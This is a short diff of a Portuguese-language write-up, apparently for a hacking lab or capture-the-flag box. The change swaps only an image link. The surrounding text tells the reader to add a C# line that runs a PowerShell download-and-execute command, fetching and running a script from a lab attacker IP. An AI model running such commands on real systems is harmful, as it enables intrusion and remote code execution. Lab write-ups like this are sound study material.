@@ -214,7 +214,7 @@ Ao baixar o arquivo para nossa máquina, podemos abri-lo no VisualStudio:
 ![Image](https://i.imgur.com/yEePAM8.png)
 
 Vamos adicionar nossa linha no código e depois compilar.
-![Image](https://i.imgur.com/MBxWpho.png)
+![Image](https://i.imgur.com/Z1YUP68.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Console.WriteLine(client.InvokePowerShell(" iex (new-object net.webclient).downloadstring('http://10.10.14.219/chu.ps1')"));
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
